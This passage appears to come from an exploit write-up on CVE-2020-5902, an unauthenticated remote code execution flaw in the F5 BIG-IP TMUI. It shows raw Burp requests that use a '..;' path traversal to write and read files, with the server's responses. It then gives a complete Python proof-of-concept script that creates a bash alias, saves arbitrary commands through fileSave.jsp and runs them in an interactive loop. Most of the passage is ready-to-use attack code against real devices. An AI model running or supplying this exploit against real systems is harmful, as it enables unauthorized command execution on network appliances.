&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error = NLSEngine.getString(&quot;ilx.workspace.error.RejectedTmshCommand&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;error = NLSEngine.getString(&quot;ilx.workspace.error.InvalidMethod&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resultObject.put(&quot;output&quot;, output);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;resultObject.put(&quot;error&quot;, error);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return resultObject;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span></p><h3 class="cs868C439D">
			<a name="文件上传"><span class="csD6CA00D2">文件上传</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Example: </span><span class="cs9FB05234">/tmui/locallb/workspace/fileSave.jsp</span></p><p class="cs40DD2BC9"><span class="cs8926E06">POST: </span><span class="cs9FB05234">fileName=/tmp/1.txt&amp;content=CVE-2020-5902</span></p><p class="cs40DD2BC9"><span class="cs8926E06">4.png</span></p><h4 class="cs868C439D">
			<a name="burpsuite-requests-1"><span class="csBF12A472">Burpsuite Requests</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 41</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">fileName=/tmp/1.txt&amp;content=CVE-2020-5902</span><span class="cs8926E06"><br/><br/><br/><br/></span><span class="cs9FB05234">HTTP/1.1 200 OK</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Date: Mon, 06 Jul 2020 02:05:29 GMT</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Frame-Options: SAMEORIGIN</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Strict-Transport-Security: max-age=16070400; includeSubDomains</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Set-Cookie: JSESSIONID=x; Path=/tmui; Secure; HttpOnly</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: text/html;charset=ISO-8859-1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Content-Type-Options: nosniff</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-XSS-Protection: 1; mode=block</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Security-Policy: default-src &#39;self&#39; &nbsp;&#39;unsafe-inline&#39; &#39;unsafe-eval&#39; data: blob:; img-src &#39;self&#39; data: &nbsp;http://127.4.1.1 http://127.4.2.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Vary: Accept-Encoding</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span></p><h4 class="cs868C439D">
			<a name="file-read-tmp1txt"><span class="csBF12A472">File Read /tmp/1.txt</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs8926E06">5.png</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/1.txt HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">HTTP/1.1 200 OK</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Date: Mon, 06 Jul 2020 02:06:07 GMT</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Frame-Options: SAMEORIGIN</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Strict-Transport-Security: max-age=16070400; includeSubDomains</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Set-Cookie: JSESSIONID=x; Path=/tmui; Secure; HttpOnly</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: text/html;charset=ISO-8859-1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Content-Type-Options: nosniff</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-XSS-Protection: 1; mode=block</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Security-Policy: default-src &#39;self&#39; &nbsp;&#39;unsafe-inline&#39; &#39;unsafe-eval&#39; data: blob:; img-src &#39;self&#39; data: &nbsp;http://127.4.1.1 http://127.4.2.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Vary: Accept-Encoding</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 32</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/><br/><br/><br/><br/></span><span class="cs9FB05234">{&quot;output&quot;:&quot;CVE-2020-5902\n&quot;}</span></p><h4 class="cs868C439D">
			<a name="upload-tmp1txt-successful-"><span class="csBF12A472">upload /tmp/1.txt Successful </span><span class="cs6EDCDAE2">！</span></a></h4>
		<h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">6.png</span></p><p class="cs3A447A38"><span class="cs9FB05234">#coding:utf-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests.packages.urllib3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">requests.packages.urllib3.disable_warnings()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import uuid</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># fileSave.jsp?fileName=/tmp/cmd&amp;content=id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># tmshCmd.jsp?command=list+/tmp/cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># tmshCmd.jsp?command=delete+cli+alias+private+list</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">banner = r&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> _______ &nbsp;_______ &nbsp;&nbsp;&nbsp;______ &nbsp;_________ _______ &nbsp;&nbsp;_________ _______ &nbsp;&nbsp;&nbsp;_______ &nbsp;_______ &nbsp;_______ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">( &nbsp;____ \( &nbsp;____ \ &nbsp;( &nbsp;___ \ \__ &nbsp;&nbsp;__/( &nbsp;____ \ &nbsp;\__ &nbsp;&nbsp;__/( &nbsp;____ ) &nbsp;( &nbsp;____ )( &nbsp;____ \( &nbsp;____ \</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">| ( &nbsp;&nbsp;&nbsp;\/| ( &nbsp;&nbsp;&nbsp;\/ &nbsp;| ( &nbsp;&nbsp;) ) &nbsp;&nbsp;) ( &nbsp;&nbsp;| ( &nbsp;&nbsp;&nbsp;\/ &nbsp;&nbsp;&nbsp;&nbsp;) ( &nbsp;&nbsp;| ( &nbsp;&nbsp;&nbsp;)| &nbsp;| ( &nbsp;&nbsp;&nbsp;)|| ( &nbsp;&nbsp;&nbsp;\/| ( &nbsp;&nbsp;&nbsp;\/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">| (__ &nbsp;&nbsp;&nbsp;| (____ &nbsp;&nbsp;&nbsp;| (__/ / &nbsp;&nbsp;&nbsp;| | &nbsp;&nbsp;| | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| | &nbsp;&nbsp;| (____)| &nbsp;| (____)|| | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| (__ &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">| &nbsp;__) &nbsp;&nbsp;(_____ \ &nbsp;&nbsp;| &nbsp;__ ( &nbsp;&nbsp;&nbsp;&nbsp;| | &nbsp;&nbsp;| | ____ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| | &nbsp;&nbsp;| &nbsp;_____) &nbsp;| &nbsp;&nbsp;&nbsp;&nbsp;__)| | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| &nbsp;__) &nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">| ( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;) ) &nbsp;| ( &nbsp;\ \ &nbsp;&nbsp;&nbsp;| | &nbsp;&nbsp;| | \_ &nbsp;) &nbsp;&nbsp;&nbsp;&nbsp;| | &nbsp;&nbsp;| ( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| (\ ( &nbsp;&nbsp;| | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| ( &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">| ) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/\____) ) &nbsp;| )___) )___) (___| (___) | &nbsp;___) (___| ) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| ) \ \__| (____/\| (____/\</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">|/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\______/ &nbsp;&nbsp;|/ \___/ \_______/(_______) &nbsp;\_______/|/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|/ &nbsp;&nbsp;\__/(_______/(_______/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2020-5902 UnAuth RCE Vuln</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Python By Jas502n</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">From: https://github.com/rapid7/metasploit-framework/blob/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">____________________________________________________________________________________________________________________________________________________</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;&#39;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def tmshCmd_exit(url,file,cmd):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;tmshCmd_url = url + &quot;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = requests.get(tmshCmd_url,verify=False,allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# r = requests.get(tmshCmd_url,verify=False,allow_redirects=False,proxies=proxies)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response_str = json.dumps(r.headers.__dict__[&#39;_store&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# print type(response_str)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# print response_str</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if r.status_code == 200 and &#39;tmui&#39; in response_str:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# print tmshCmd_url</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] tmshCmd.jsp Exit!&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] create cli alias private list command bash \n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# cmd = &#39;whoami&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;upload_exit(url,file,cmd)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] tmshCmd.jsp No Exit!\n&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def upload_exit(url,file,cmd):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fileSave_url = url + &quot;/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/%s&amp;content=&quot;%file + cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = requests.get(fileSave_url,verify=False,allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# r = requests.get(fileSave_url,verify=False,allow_redirects=False,proxies=proxies)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response_str = json.dumps(r.headers.__dict__[&#39;_store&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if r.status_code == 200 and &#39;tmui&#39; in response_str:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# print fileSave_url</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] fileSave.jsp Exit!\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;list_command(url,file)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] fileSave.jsp No Exit!\n&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def list_command(url,file):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;rce_url = url + &quot;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s&quot; % file</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = requests.get(rce_url,verify=False,allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# r = requests.get(rce_url,verify=False,allow_redirects=False,proxies=proxies)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response_str = json.dumps(r.headers.__dict__[&#39;_store&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# print len(r.content)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if r.status_code == 200 and &#39;tmui&#39; in response_str:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if len(r.content) &gt; 33:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# print rce_url</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] Command Successfull !\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command_result = json.loads(r.content)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;_&quot;*90,&#39;\n\n&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print command_result[&#39;output&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;_&quot;*90,&quot;\n\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delete_list(url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] Command Failed !\n&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def delete_list(url):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;delete_url = url + &#39;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = requests.get(delete_url,verify=False,allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# r = requests.get(delete_url,verify=False,allow_redirects=False,proxies=proxies)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;response_str = json.dumps(r.headers.__dict__[&#39;_store&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if r.status_code == 200 and &#39;tmui&#39; in response_str:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# print delete_url</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] delete cli alias private list Successfull! \n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;[+] delete cli alias private list Failed! \n&quot;</span><span class="cs8926E06"><br/><br/><br/><br/><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print banner</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while 1:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url = &quot;https://x.x.x.x/&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# url = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file = str(uuid.uuid1())</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;/tmp/&quot; + file,&quot;\n&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = raw_input(&quot;[+]Set Cmd= &quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmshCmd_exit(url,file,cmd)</span></p></body>
</html>
